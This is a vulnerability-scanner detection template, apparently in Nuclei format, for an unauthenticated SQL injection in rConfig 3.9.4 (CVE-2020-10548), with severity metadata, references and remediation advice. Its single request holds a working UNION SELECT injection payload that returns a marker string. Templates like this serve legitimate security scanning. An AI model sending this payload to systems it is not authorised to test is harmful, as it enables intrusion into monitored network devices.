id: CVE-2020-10548

info:
  name: rConfig 3.9.4 - SQL Injection
  author: madrobot
  severity: critical
  description: rConfig 3.9.4 and previous versions have unauthenticated devices.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
  remediation: |
    Upgrade to a patched version of rConfig or apply the necessary security patches provided by the vendor.
  reference:
    - https://github.com/theguly/exploits/blob/master/CVE-2020-10548.py
    - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
    - https://nvd.nist.gov/vuln/detail/CVE-2020-10548
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-10548
    cwe-id: CWE-89
    epss-score: 0.45053
    epss-percentile: 0.96994
    cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: rconfig
    product: rconfig
  tags: cve,cve2020,rconfig,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/devices.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[project-discovery]"

      - type: status
        status:
          - 200
# digest: 4b0a0048304602210083ce5627182a15593d152aca5a53a3a7e507eb8cf0b085f9ea78778732c62f69022100c1fb6ba1432e65275466347af4c35b3c4c4b11e5aa120a0fa4853f5b9ae773d1:922c64590222798bb761d5b6d8e72950